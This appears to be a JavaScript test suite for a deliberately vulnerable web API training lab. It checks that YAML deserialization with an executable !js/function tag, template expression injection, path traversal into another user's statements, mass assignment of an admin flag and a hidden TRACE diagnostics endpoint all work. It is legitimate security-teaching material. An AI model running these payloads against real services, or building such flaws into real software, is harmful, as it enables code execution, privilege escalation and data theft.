require('dotenv').config();
const request = require('supertest')(require('./helpers/base-url'));
const expect = require('chai').expect;

describe('VulnAPI-inspired realistic challenges', function () {
  let token;

  before(async function () {
    const login = await request.post('/api/v2/login').send({ username: 'test', password: 'test' });
    token = login.body.token;
    expect(token).to.be.a('string');
  });

  it('imports supplier YAML and demonstrates the executable hook tag with a temp marker', async function () {
    const markerName = `dvws-yaml-import-marker-${Date.now()}-${Math.random().toString(36).slice(2, 7)}.txt`;
    const yamlBatch = [
      'supplier: Northstar Components',
      'orders:',
      '  - sku: BRG-104',
      '    quantity: 12',
      `postImport: !js/function "require('fs').writeFileSync('public/${markerName}', 'executed')"`
    ].join('\n');

    const response = await request.post('/api/v2/integrations/supplier-orders/import')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', Buffer.from(yamlBatch), 'orders.yaml');

    expect(response.status).to.eql(200);
    expect(response.body.imported).to.eql(1);
    try {
      const marker = await request.get(`/${markerName}`);
      expect(marker.status).to.eql(200);
      expect(marker.text).to.eql('executed');
    } finally {
      const cleanup = [
        'orders: []',
        `postImport: !js/function "try { require('fs').unlinkSync('public/${markerName}'); } catch (_) {}"`
      ].join('\n');
      await request.post('/api/v2/integrations/supplier-orders/import')
        .set('Authorization', `Bearer ${token}`)
        .attach('file', Buffer.from(cleanup), 'cleanup.yaml');
    }
  });

  it('evaluates a supplied greeter expression and serves the SOAP WSDL', async function () {
    const greeting = await request.get('/api/v2/greeter').query({ name: '${7*7}' });
    expect(greeting.status).to.eql(200);
    expect(greeting.text).to.eql('Hello 49');

    const wsdl = await request.get('/dvwsuserservice?wsdl');
    expect(wsdl.status).to.eql(200);
    expect(wsdl.headers['content-type']).to.include('application/xml');
    expect(wsdl.text).to.include('definitions');
  });

  it('reads another account’s generated monthly statement through period path traversal', async function () {
    const username = `report_owner_${Date.now()}`;
    const email = `${username}@dvws.local`;
    const created = await request.post('/api/v2/users').send({ username, password: 'Report123!', email });
    expect(created.status).to.eql(201);
    const ownerLogin = await request.post('/api/v2/login').send({ username, password: 'Report123!' });
    expect(ownerLogin.status).to.eql(200);
    const ownerToken = ownerLogin.body.token;

    const period = new Date().toISOString().slice(0, 7);
    const initialReport = await request.get('/api/v2/reports/monthly')
      .set('Authorization', `Bearer ${ownerToken}`)
      .query({ period });
    expect(initialReport.status).to.eql(200);
    expect(initialReport.body.statement.totalCreditsBilled).to.eql(0);

    const purchase = await request.post('/api/v2/resource-store/orders')
      .set('Authorization', `Bearer ${ownerToken}`)
      .send({ itemId: 'api-monitor', quantity: 2 });
    expect(purchase.status).to.eql(201);

    const ordinary = await request.get('/api/v2/reports/monthly')
      .set('Authorization', `Bearer ${ownerToken}`)
      .query({ period });
    expect(ordinary.status).to.eql(200);
    expect(ordinary.body.account).to.eql({ username, email });
    expect(ordinary.body.statement.totalCreditsBilled).to.eql(20);

    const traversed = await request.get('/api/v2/reports/monthly')
      .set('Authorization', `Bearer ${token}`)
      .query({ period: `../${username}/${period}` });
    expect(traversed.status).to.eql(200);
    expect(traversed.body.account.username).to.eql(username);
    expect(traversed.body.statement.orders[0].itemName).to.eql('API Monitor');
    expect(traversed.body.statement.totalCreditsBilled).to.eql(20);
  });

  it('allows a settings update to mass-assign the admin field', async function () {
    const username = `prefs_${Date.now()}`;
    const created = await request.post('/api/v2/users').send({ username, password: 'Prefs123!' });
    expect(created.status).to.eql(201);

    const login = await request.post('/api/v2/login').send({ username, password: 'Prefs123!' });
    const prefsToken = login.body.token;
    expect(login.body.result.admin).to.eql(false);

    const updated = await request.put('/api/v2/users/notification-preferences')
      .set('Authorization', `Bearer ${prefsToken}`)
      .send({ email: 'alerts@example.test', weeklyDigest: true, admin: true });
    expect(updated.status).to.eql(200);
    expect(updated.body.admin).to.eql(true);

    const escalatedLogin = await request.post('/api/v2/login').send({ username, password: 'Prefs123!' });
    const adminCheck = await request.get('/api/v2/users/checkadmin')
      .set('Authorization', `Bearer ${escalatedLogin.body.token}`);
    expect(adminCheck.body.Success).to.eql('User is Admin Privileged');
  });

  it('exposes diagnostics only through TRACE and omits the path from OpenAPI', async function () {
    const diagnostics = await request.trace('/internal/diagnostics');
    expect(diagnostics.status).to.eql(200);
    expect(diagnostics.body.service).to.eql('DVWS customer accounts');
    expect(diagnostics.body.accounts).to.be.an('array');

    const spec = await request.get('/openAPI-spec.json');
    expect(spec.status).to.eql(200);
    expect(spec.body.paths).to.have.property('/v2/integrations/supplier-orders/import');
    expect(spec.body.paths).to.have.property('/v2/reports/monthly');
    expect(spec.body.paths).to.have.property('/v2/users/notification-preferences');
    expect(JSON.stringify(spec.body)).not.to.include('/internal/diagnostics');
  });
});
